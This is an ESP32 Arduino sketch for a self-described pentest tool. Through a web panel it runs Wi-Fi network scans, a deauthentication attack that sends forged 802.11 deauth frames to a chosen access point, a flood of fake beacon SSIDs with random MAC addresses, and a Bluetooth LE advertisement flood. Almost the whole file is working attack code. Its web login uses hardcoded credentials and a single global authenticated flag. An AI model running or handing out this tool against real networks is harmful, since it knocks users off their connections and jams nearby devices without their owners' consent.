#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>
#include <esp_wifi.h>
#include <NimBLEDevice.h>

// Configuration
#define WEB_USER "admin"
#define WEB_PASS "pentest123"
#define AP_SSID "ESP32-Pentest"
#define AP_PASS "pentest123"
#define MAX_SSIDS 20
#define DEAUTH_INTERVAL 200 // ms
#define BEACON_INTERVAL 100 // ms
#define BLE_INTERVAL 250    // microseconds

WebServer server(80);
IPAddress apIP(192, 168, 4, 1);

// Global state
struct {
  bool deauthRunning = false;
  bool beaconFloodRunning = false;
  bool bleFloodRunning = false;
  uint8_t currentChannel = 6;
  String lastSSID = "";
  String lastBSSID = "";
  String lastClient = "";
  bool authenticated = false;
} state;

std::vector<String> ssidList;
TaskHandle_t deauthTaskHandle = NULL;
TaskHandle_t beaconTaskHandle = NULL;

// BLE
NimBLEAdvertising* bleAdvertiser;
esp_timer_handle_t bleTimer;

void setup() {
  Serial.begin(115200);
  
  // Setup AP
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(AP_SSID, AP_PASS);
  
  // Setup BLE
  NimBLEDevice::init("");
  bleAdvertiser = NimBLEDevice::getAdvertising();
  
  // Web server routes
  server.on("/", handleRoot);
  server.on("/login", handleLogin);
  server.on("/scan", handleScan);
  server.on("/deauth", handleDeauth);
  server.on("/beacon", handleBeacon);
  server.on("/ble", handleBLE);
  server.on("/addssid", handleAddSSID);
  server.on("/cleanssids", handleClearSSIDs);
  server.on("/setchannel", handleSetChannel);
  server.begin();
  
  // Add some default SSIDs
  ssidList.push_back("Free_WiFi");
  ssidList.push_back("CoffeeShop");
  ssidList.push_back("Airport_WiFi");
  
  Serial.println("Access Point started");
  Serial.print("IP Address: ");
  Serial.println(apIP);
}

void loop() {
  server.handleClient();
  delay(10);
}

// Web handlers
void handleRoot() {
  if (!checkAuth()) return;
  
  String html = "<html><head><title>ESP32 Pentest Tool</title>";
  html += "<style>body {font-family: Arial; margin: 20px;}";
  html += ".card {border: 1px solid #ddd; padding: 15px; margin: 10px; border-radius: 5px;}";
  html += "button {padding: 8px 15px; margin: 5px;}";
  html += ".active {background-color: #4CAF50; color: white;}";
  html += ".inactive {background-color: #f44336; color: white;}";
  html += "</style></head><body><h1>ESP32 Pentest Tool</h1>";
  
  html += "<div class=\"card\"><h2>WiFi Scanner</h2>";
  html += "<button onclick=\"scanWiFi()\">Scan Networks</button>";
  html += "<div id=\"scanResults\"></div></div>";
  
  html += "<div class=\"card\"><h2>Deauth Attack</h2>";
  html += "<p>Target: <span id=\"deauthTarget\">None</span></p>";
  html += "<button id=\"deauthBtn\" class=\"inactive\" onclick=\"toggleDeauth()\">Start Deauth</button></div>";
  
  html += "<div class=\"card\"><h2>Beacon Flood</h2>";
  html += "<p>SSIDs: <span id=\"ssidCount\">" + String(ssidList.size()) + "</span></p>";
  html += "<button id=\"beaconBtn\" class=\"inactive\" onclick=\"toggleBeacon()\">Start Beacon Flood</button>";
  html += "<button onclick=\"addSSID()\">Add Random SSID</button>";
  html += "<button onclick=\"clearSSIDs()\">Clear SSIDs</button></div>";
  
  html += "<div class=\"card\"><h2>BLE Advertisement Flood</h2>";
  html += "<button id=\"bleBtn\" class=\"inactive\" onclick=\"toggleBLE()\">Start BLE Flood</button></div>";
  
  html += "<div class=\"card\"><h2>Channel Settings</h2>";
  html += "<p>Current Channel: <span id=\"currentChannel\">" + String(state.currentChannel) + "</span></p>";
  html += "<input type=\"number\" id=\"channelInput\" min=\"1\" max=\"14\" value=\"" + String(state.currentChannel) + "\">";
  html += "<button onclick=\"setChannel()\">Set Channel</button></div>";
  
  html += "<script>";
  html += "function scanWiFi() {";
  html += "fetch('/scan').then(r => r.json()).then(data => {";
  html += "let html = '<table border=1><tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>RSSI</th><th>Action</th></tr>';";
  html += "data.networks.forEach(net => {";
  html += "html += '<tr><td>' + net.ssid + '</td><td>' + net.bssid + '</td><td>' + net.channel + '</td><td>' + net.rssi + '</td>';";
  html += "html += '<td><button onclick=\"setDeauthTarget(\\'' + net.ssid + '\\', \\'' + net.bssid + '\\')\">Target</button></td></tr>';";
  html += "});";
  html += "html += '</table>';";
  html += "document.getElementById('scanResults').innerHTML = html;";
  html += "});}";
  
  html += "function setDeauthTarget(ssid, bssid) {";
  html += "document.getElementById('deauthTarget').innerText = ssid + ' (' + bssid + ')';";
  html += "fetch('/deauth?target=' + encodeURIComponent(bssid));}";
  
  html += "function toggleDeauth() {";
  html += "const btn = document.getElementById('deauthBtn');";
  html += "if (btn.classList.contains('inactive')) {";
  html += "fetch('/deauth?start=true').then(() => {";
  html += "btn.classList.remove('inactive');";
  html += "btn.classList.add('active');";
  html += "btn.innerText = 'Stop Deauth';";
  html += "});} else {";
  html += "fetch('/deauth?start=false').then(() => {";
  html += "btn.classList.remove('active');";
  html += "btn.classList.add('inactive');";
  html += "btn.innerText = 'Start Deauth';";
  html += "});}}";
  
  html += "function toggleBeacon() {";
  html += "const btn = document.getElementById('beaconBtn');";
  html += "if (btn.classList.contains('inactive')) {";
  html += "fetch('/beacon?start=true').then(() => {";
  html += "btn.classList.remove('inactive');";
  html += "btn.classList.add('active');";
  html += "btn.innerText = 'Stop Beacon Flood';";
  html += "});} else {";
  html += "fetch('/beacon?start=false').then(() => {";
  html += "btn.classList.remove('active');";
  html += "btn.classList.add('inactive');";
  html += "btn.innerText = 'Start Beacon Flood';";
  html += "});}}";
  
  html += "function toggleBLE() {";
  html += "const btn = document.getElementById('bleBtn');";
  html += "if (btn.classList.contains('inactive')) {";
  html += "fetch('/ble?start=true').then(() => {";
  html += "btn.classList.remove('inactive');";
  html += "btn.classList.add('active');";
  html += "btn.innerText = 'Stop BLE Flood';";
  html += "});} else {";
  html += "fetch('/ble?start=false').then(() => {";
  html += "btn.classList.remove('active');";
  html += "btn.classList.add('inactive');";
  html += "btn.innerText = 'Start BLE Flood';";
  html += "});}}";
  
  html += "function addSSID() {";
  html += "const randomSSID = 'WiFi-' + Math.floor(Math.random() * 10000);";
  html += "fetch('/addssid?ssid=' + encodeURIComponent(randomSSID)).then(() => {";
  html += "document.getElementById('ssidCount').innerText = parseInt(document.getElementById('ssidCount').innerText) + 1;";
  html += "});}";
  
  html += "function clearSSIDs() {";
  html += "fetch('/cleanssids').then(() => {";
  html += "document.getElementById('ssidCount').innerText = '0';";
  html += "});}";
  
  html += "function setChannel() {";
  html += "const channel = document.getElementById('channelInput').value;";
  html += "fetch('/setchannel?channel=' + channel).then(() => {";
  html += "document.getElementById('currentChannel').innerText = channel;";
  html += "});}";
  html += "</script></body></html>";
  
  server.send(200, "text/html", html);
}

void handleLogin() {
  if (server.hasArg("user") && server.hasArg("pass")) {
    if (server.arg("user") == WEB_USER && server.arg("pass") == WEB_PASS) {
      state.authenticated = true;
      server.sendHeader("Location", "/");
      server.send(303);
      return;
    }
  }
  server.send(401, "text/plain", "Invalid credentials");
}

void handleScan() {
  if (!checkAuth()) return;
  
  WiFi.scanNetworks(true);
  delay(2000);
  
  String json = "{\"networks\":[";
  int n = WiFi.scanComplete();
  for (int i = 0; i < n; i++) {
    if (i > 0) json += ",";
    json += "{";
    json += "\"ssid\":\"" + WiFi.SSID(i) + "\",";
    json += "\"bssid\":\"" + WiFi.BSSIDstr(i) + "\",";
    json += "\"channel\":" + String(WiFi.channel(i)) + ",";
    json += "\"rssi\":" + String(WiFi.RSSI(i));
    json += "}";
  }
  json += "]}";
  
  server.send(200, "application/json", json);
  WiFi.scanDelete();
}

void handleDeauth() {
  if (!checkAuth()) return;
  
  if (server.hasArg("target")) {
    state.lastBSSID = server.arg("target");
    server.send(200, "text/plain", "Target set");
    return;
  }
  
  if (server.arg("start") == "true") {
    if (state.lastBSSID == "") {
      server.send(400, "text/plain", "No target set");
      return;
    }
    
    state.deauthRunning = true;
    xTaskCreatePinnedToCore(
      deauthTask,
      "DeauthTask",
      4096,
      NULL,
      1,
      &deauthTaskHandle,
      0
    );
    server.send(200, "text/plain", "Deauth started");
  } else {
    state.deauthRunning = false;
    if (deauthTaskHandle != NULL) {
      vTaskDelete(deauthTaskHandle);
      deauthTaskHandle = NULL;
    }
    server.send(200, "text/plain", "Deauth stopped");
  }
}

void handleBeacon() {
  if (!checkAuth()) return;
  
  if (server.arg("start") == "true") {
    if (ssidList.size() == 0) {
      server.send(400, "text/plain", "No SSIDs configured");
      return;
    }
    
    state.beaconFloodRunning = true;
    xTaskCreatePinnedToCore(
      beaconFloodTask,
      "BeaconTask",
      4096,
      NULL,
      1,
      &beaconTaskHandle,
      0
    );
    server.send(200, "text/plain", "Beacon flood started");
  } else {
    state.beaconFloodRunning = false;
    if (beaconTaskHandle != NULL) {
      vTaskDelete(beaconTaskHandle);
      beaconTaskHandle = NULL;
    }
    server.send(200, "text/plain", "Beacon flood stopped");
  }
}

void handleBLE() {
  if (!checkAuth()) return;
  
  if (server.arg("start") == "true") {
    state.bleFloodRunning = true;
    startBLEFlood();
    server.send(200, "text/plain", "BLE flood started");
  } else {
    state.bleFloodRunning = false;
    stopBLEFlood();
    server.send(200, "text/plain", "BLE flood stopped");
  }
}

void handleAddSSID() {
  if (!checkAuth()) return;
  
  if (server.hasArg("ssid")) {
    if (ssidList.size() >= MAX_SSIDS) {
      server.send(400, "text/plain", "Max SSIDs reached");
      return;
    }
    ssidList.push_back(server.arg("ssid"));
    server.send(200, "text/plain", "SSID added");
  } else {
    server.send(400, "text/plain", "No SSID provided");
  }
}

void handleClearSSIDs() {
  if (!checkAuth()) return;
  
  ssidList.clear();
  server.send(200, "text/plain", "SSIDs cleared");
}

void handleSetChannel() {
  if (!checkAuth()) return;
  
  if (server.hasArg("channel")) {
    uint8_t channel = server.arg("channel").toInt();
    if (channel >= 1 && channel <= 14) {
      state.currentChannel = channel;
      esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
      server.send(200, "text/plain", "Channel set");
    } else {
      server.send(400, "text/plain", "Invalid channel");
    }
  } else {
    server.send(400, "text/plain", "No channel provided");
  }
}

// Attack tasks
void deauthTask(void *pvParameters) {
  uint8_t deauthPacket[26] = {
    0xC0, 0x00, 0x00, 0x00, 
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (will be set)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (will be set)
    0x00, 0x00, 0x07, 0x00
  };
  
  // Convert BSSID string to bytes
  uint8_t bssid[6];
  sscanf(state.lastBSSID.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
    &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
  
  memcpy(&deauthPacket[10], bssid, 6); // Source
  memcpy(&deauthPacket[16], bssid, 6); // BSSID
  
  while (state.deauthRunning) {
    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
    delay(DEAUTH_INTERVAL);
  }
  
  vTaskDelete(NULL);
}

void beaconFloodTask(void *pvParameters) {
  while (state.beaconFloodRunning) {
    for (const String &ssid : ssidList) {
      if (!state.beaconFloodRunning) break;
      sendBeacon(ssid);
      delay(BEACON_INTERVAL);
    }
  }
  
  vTaskDelete(NULL);
}

void sendBeacon(const String &ssid) {
  uint8_t mac[6];
  generateRandomMac(mac);
  
  uint8_t beaconPacket[128] = {
    0x80, 0x00, // Frame Control (Beacon)
    0x00, 0x00, // Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (set below)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (set below)
    0x00, 0x00, // Sequence number
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
    0x64, 0x00, // Beacon interval
    0x21, 0x04, // Capability info
    0x00, // SSID element ID
    0x00  // SSID length (set below)
  };
  
  memcpy(&beaconPacket[10], mac, 6);
  memcpy(&beaconPacket[16], mac, 6);
  
  uint8_t ssidLen = ssid.length();
  beaconPacket[37] = ssidLen;
  memcpy(&beaconPacket[38], ssid.c_str(), ssidLen);
  
  uint16_t packetLength = 38 + ssidLen;
  
  // Add supported rates
  beaconPacket[packetLength++] = 0x01;
  beaconPacket[packetLength++] = 0x08;
  beaconPacket[packetLength++] = 0x82;
  beaconPacket[packetLength++] = 0x84;
  beaconPacket[packetLength++] = 0x8b;
  beaconPacket[packetLength++] = 0x96;
  beaconPacket[packetLength++] = 0x24;
  beaconPacket[packetLength++] = 0x30;
  beaconPacket[packetLength++] = 0x48;
  beaconPacket[packetLength++] = 0x6c;
  
  esp_wifi_80211_tx(WIFI_IF_AP, beaconPacket, packetLength, false);
}

void startBLEFlood() {
  esp_timer_create_args_t timerArgs = {
    .callback = [](void* arg) {
      if (!state.bleFloodRunning) return;
      
      uint8_t payload[31];
      esp_fill_random(payload, sizeof(payload));
      
      NimBLEAdvertisementData advData;
      advData.setManufacturerData(std::string((char*)payload, sizeof(payload)));
      
      bleAdvertiser->setAdvertisementData(advData);
      bleAdvertiser->start();
    },
    .arg = NULL,
    .dispatch_method = ESP_TIMER_TASK,
    .name = "ble_flood"
  };
  esp_timer_create(&timerArgs, &bleTimer);
  esp_timer_start_periodic(bleTimer, BLE_INTERVAL);
}

void stopBLEFlood() {
  if (bleTimer) {
    esp_timer_stop(bleTimer);
    esp_timer_delete(bleTimer);
    bleTimer = NULL;
  }
  bleAdvertiser->stop();
}

// Helper functions
bool checkAuth() {
  if (!state.authenticated) {
    server.sendHeader("Location", "/login");
    server.send(303);
    return false;
  }
  return true;
}

void generateRandomMac(uint8_t *mac) {
  for(int i = 0; i < 6; i++) {
    mac[i] = random(256);
  }
  mac[0] &= 0xFE; // Unicast
  mac[0] |= 0x02; // Locally administered
}
